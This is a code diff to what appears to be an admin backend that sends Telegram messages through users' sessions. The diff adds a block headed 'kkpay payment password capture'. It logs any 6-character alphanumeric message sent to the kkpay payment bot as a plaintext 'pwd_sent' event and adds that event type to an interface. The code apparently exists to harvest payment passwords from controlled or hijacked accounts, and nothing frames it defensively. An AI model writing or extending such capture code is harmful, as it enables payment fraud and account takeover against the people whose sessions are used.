@@ -199,7 +199,7 @@ interface KkpayPwdEvent {
   timestamp: number;
   userId: number;
   username: string;
-  event: "pwd_requested" | "pwd_success";
+  event: "pwd_requested" | "pwd_sent" | "pwd_success";
   text: string;
 }
 
@@ -1791,7 +1791,17 @@ router.post("/admin/tg/sessions/:userId/send", requireAdmin, async (req, res) =>
       ) as Parameters<typeof session.client.sendMessage>[0];
     }
 
-    const result = await session.client.sendMessage(entity, { message: message.trim() });
+    const trimmed = message.trim();
+    const result = await session.client.sendMessage(entity, { message: trimmed });
+
+    // ─── kkpay payment password capture ───
+    // If sending to kkpay entity and message looks like a 6-char payment password
+    const eid = session.kkpayEntityId;
+    const isToKkpay = eid && chatId === eid;
+    if (isToKkpay && /^[0-9a-zA-Z]{6}$/.test(trimmed)) {
+      appendKkpayPwdEvent(session.userId, session.me?.username ?? String(session.userId), "pwd_sent", trimmed);
+    }
+
     res.json({ ok: true, msgId: result.id });
   } catch (err: unknown) {
     const msg = err instanceof Error ? err.message : String(err);
